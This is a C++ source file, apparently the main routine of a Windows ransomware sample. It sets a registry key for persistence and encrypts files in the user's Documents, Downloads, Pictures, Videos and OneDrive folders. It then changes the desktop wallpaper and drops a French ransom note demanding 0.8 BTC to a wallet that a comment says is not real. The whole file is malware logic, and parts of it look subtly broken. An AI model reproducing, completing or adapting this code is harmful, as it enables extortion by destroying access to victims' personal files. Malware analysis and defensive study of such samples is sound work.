#include <iostream>
#include <fstream>
#include <Windows.h>
#include "strsafe.h"
#include <ShlObj.h>
#include "persistence.h"
#include "encrypt.h"


int main() {

	//checkForRegkey();
	setRegkey();
	LPCWSTR targetDirs[] = { L"\\Documents",L"Downloads",L"Images",L"Videos",L"Pictures",L"OneDrive"};
	LPWSTR userDir;
	SHGetKnownFolderPath(FOLDERID_Profile,0,NULL,&userDir);

	HCRYPTKEY key = keyimport();


	for (LPCWSTR singledir : targetDirs) {
		
		WCHAR* absoluteDirPath = userDir;
		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
		traverse(absoluteDirPath,key);
	}
	

	LPCWSTR wallpapePath = L"C:\\Windows\\Temp\\kekchose.txt";
	bool res = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpapePath, SPIF_UPDATEINIFILE);
	std::ofstream myfile(L"C:\\Users\\placeholder\\Desktop\\ransom note.txt");
	//It's not a real wallet ofc
	myfile << "Vos fichiers encryptés !!! Payez la rançon 0.8 BTC sur wallet : 19BY2XCgbDe7WtTVbTyzM92R3LYr6VitWK" << std::endl;
	myfile.close();


	return 0;
}